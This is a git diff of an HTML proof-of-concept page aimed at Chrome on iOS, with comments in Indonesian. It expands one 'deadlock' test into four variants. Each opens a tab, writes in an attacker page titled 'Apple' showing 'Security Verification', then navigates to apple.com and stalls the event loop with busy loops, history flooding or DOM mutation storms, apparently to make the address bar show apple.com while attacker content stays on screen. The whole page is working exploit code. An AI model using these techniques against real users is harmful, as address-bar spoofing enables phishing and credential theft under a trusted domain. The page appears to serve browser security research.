@@ -6,13 +6,13 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Ultimate Desync & Pipeline Deadlock PoC - Zero</title>
+    <title>Comprehensive Desync Test Suite - Zero</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #000;
+        background: #0f0f11;
         color: #fff;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
@@ -22,97 +22,181 @@
         align-items: center;
         justify-content: center;
         height: 100%;
+        gap: 16px;
+        padding: 20px;
+        box-sizing: border-box;
+      }
+      h1 {
+        font-size: 24px;
+        margin-bottom: 10px;
+        color: #f5f5f7;
       }
       button {
-        padding: 24px 48px;
-        font-size: 22px;
-        font-weight: bold;
-        background: #ff3b30;
+        width: 100%;
+        max-width: 360px;
+        padding: 16px 24px;
+        font-size: 16px;
+        font-weight: 600;
+        background: #007aff;
         color: #fff;
         border: none;
-        border-radius: 16px;
+        border-radius: 12px;
         cursor: pointer;
-        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
-        transition: transform 0.1s ease;
+        box-shadow: 0 4px 14px rgba(0, 122, 255, 0.3);
+        transition: transform 0.1s ease, background 0.2s ease;
       }
       button:active {
-        transform: scale(0.95);
+        transform: scale(0.97);
+      }
+      .btn-danger {
+        background: #ff3b30;
+        box-shadow: 0 4px 14px rgba(255, 59, 48, 0.3);
+      }
+      .btn-warning {
+        background: #ff9500;
+        box-shadow: 0 4px 14px rgba(255, 149, 0, 0.3);
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <button id="startBtn">EXECUTE ULTIMATE DEADLOCK TEST</button>
+      <h1>Chrome iOS Desync Test Suite</h1>
+      
+      <!-- Test 1: Standard Reflow Stalling -->
+      <button id="test1">Test 1: Standard Reflow Stalling</button>
+
+      <!-- Test 2: History State Flooding + Reflow -->
+      <button id="test2" class="btn-warning">Test 2: History State Flooding</button>
+
+      <!-- Test 3: Aggressive DOM Mutation Storm -->
+      <button id="test3" class="btn-danger">Test 3: DOM Mutation Storm</button>
+
+      <!-- Test 4: Rapid Navigation Target Switch -->
+      <button id="test4">Test 4: Multi-Target Location Switch</button>
     </div>
 
     <script>
-      document.getElementById("startBtn").onclick = function () {
-        this.style.display = 'none';
+      // Helper universal untuk membuat template tab penyerang
+      function injectAttackerContent(win) {
+        if (!win) return;
+        win.document.write(`
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Apple</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+          </head>
+          <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
+            <div>
+              <h1 style="font-size:36px;font-weight:700;color:#1d1d1f;margin:0 0 12px 0;">Security Verification</h1>
+              <p style="font-size:18px;color:#86868b;margin:0;">Testing pipeline synchronization state...</p>
+            </div>
+          </body>
+          </html>
+        `);
+        win.document.close();
+        try { win.focus(); } catch (e) {}
+      }
 
-        // 1. Membuka tab baru secara bersih
+      // --- TEST 1 ---
+      document.getElementById("test1").onclick = function () {
         const newTab = window.open("", "_blank");
-
         if (newTab) {
-          // 2. Menyuntikkan DOM konten penyerang (attacker-controlled content)
-          newTab.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head>
-              <title>Apple</title>
-              <meta name="viewport" content="width=device-width, initial-scale=1">
-            </head>
-            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-              <div id="wrapper">
-                <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Security Verification</h1>
-                <p style="font-size:20px;color:#86868b;margin:0;">Establishing deep navigation pipeline sync...</p>
-              </div>
-            </body>
-            </html>
-          `);
-          newTab.document.close();
-
-          // 3. Memaksa fokus agar WebState terdaftar sebagai primary/visible secara instan
-          try {
-            newTab.focus();
-          } catch (e) {}
-
-          // 4. Tahap 1: Memicu navigasi asinkron ganda (mengecoh antrean provisional navigation)
-          setTimeout(() => {
-            try {
-              // Membanjiri history state lokal terlebih dahulu untuk menciptakan state pending ganda
-              newTab.history.pushState({page: 1}, "", "#secure-auth");
-              newTab.location.href = "https://apple.com";
-            } catch (err) {
-              console.error(err);
-            }
-          }, 10);
-
-          // 5. Tahap 2: Menembak render thread dengan Aggressive Layout Reflow & Event Loop Stalling
+          injectAttackerContent(newTab);
+          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 15);
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                const docBody = document.body;
-                while (Date.now() - start < 2500) {
-                  // Melakukan mutasi DOM berat secara konstan bersamaan dengan pembacaan layout properties
-                  // Ini mengunci event loop WebKit agar delegate callback tertunda secara permanen.
-                  const heightVal = docBody.offsetHeight;
-                  docBody.style.backgroundColor = (heightVal % 2 === 0) ? '#ffffff' : '#f9f9f9';
-                  
-                  // Memaksa eksekusi tugas mikro yang membebani antrean message loop
-                  const div = document.createElement('div');
-                  div.innerText = Math.random();
-                  docBody.appendChild(div);
-                  if (docBody.childNodes.length > 50) {
-                    docBody.innerHTML = '<h1>Locked State Active</h1>';
-                  }
+                while (Date.now() - start < 2000) {
+                  const h = document.body.offsetHeight;
+                  document.body.style.background = (h % 2 === 0) ? '#fff' : '#fafafa';
                 }
               `);
             } catch (e) {
-              let start = Date.now();
-              while (Date.now() - start < 2500) {}
+              let s = Date.now(); while(Date.now() - s < 2000) {}
             }
-          }, 75);
+          }, 90);
+        }
+      };
+
+      // --- TEST 2 ---
+      document.getElementById("test2").onclick = function () {
+        const newTab = window.open("", "_blank");
+        if (newTab) {
+          injectAttackerContent(newTab);
+          setTimeout(() => {
+            try {
+              newTab.history.pushState({test: 1}, "", "#locked-state");
+              newTab.location.href = "https://apple.com";
+            } catch (err) {}
+          }, 15);
+          setTimeout(() => {
+            try {
+              newTab.eval(`
+                const start = Date.now();
+                while (Date.now() - start < 2200) {
+                  history.pushState({test: Math.random()}, "", "#flood");
+                  const d = document.body.offsetHeight;
+                }
+              `);
+            } catch (e) {
+              let s = Date.now(); while(Date.now() - s < 2200) {}
+            }
+          }, 80);
+        }
+      };
+
+      // --- TEST 3 ---
+      document.getElementById("test3").onclick = function () {
+        const newTab = window.open("", "_blank");
+        if (newTab) {
+          injectAttackerContent(newTab);
+          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 15);
+          setTimeout(() => {
+            try {
+              newTab.eval(`
+                const start = Date.now();
+                const body = document.body;
+                while (Date.now() - start < 2500) {
+                  const el = document.createElement('div');
+                  el.innerText = Math.random();
+                  body.appendChild(el);
+                  if(body.childNodes.length > 100) body.innerHTML = "<h1>Locked</h1>";
+                }
+              `);
+            } catch (e) {
+              let s = Date.now(); while(Date.now() - s < 2500) {}
+            }
+          }, 70);
+        }
+      };
+
+      // --- TEST 4 ---
+      document.getElementById("test4").onclick = function () {
+        const newTab = window.open("", "_blank");
+        if (newTab) {
+          injectAttackerContent(newTab);
+          setTimeout(() => {
+            try {
+              newTab.location.href = "https://google.com";
+              setTimeout(() => {
+                newTab.location.href = "https://apple.com";
+              }, 10);
+            } catch (err) {}
+          }, 10);
+          setTimeout(() => {
+            try {
+              newTab.eval(`
+                const start = Date.now();
+                while (Date.now() - start < 2000) {
+                  const f = document.body.offsetHeight;
+                }
+              `);
+            } catch (e) {
+              let s = Date.now(); while(Date.now() - s < 2000) {}
+            }
+          }, 60);
         }
       };
     </script>
